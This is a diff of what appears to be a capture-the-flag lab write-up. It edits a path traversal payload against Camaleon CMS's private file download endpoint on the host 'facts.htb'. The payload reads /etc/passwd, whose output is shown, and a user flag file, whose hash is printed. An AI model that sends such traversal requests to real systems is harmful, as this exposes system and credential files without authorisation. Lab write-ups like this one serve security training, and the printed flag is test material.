@@ -224,7 +224,7 @@ now after reading the cve found https://github.com/owen2345/camaleon-cms/securit
 
 where a path traversal vulnerability accessible
 
-http://facts.htb/admin/media//download_private_filefile=../../../../../../etc/passwd
+http://facts.htb/admin/media/download_private_filefile=../../../../../../etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -264,7 +264,7 @@ _laurel:x:101:988::/var/log/laurel:/bin/false
 
 then try to get the flag
 
-http://facts.htb/admin/media//download_private_file?file=../../../../../../home/william/user.txt
+http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt
 
 d4b1d53271451562b47c432921785065
 ```
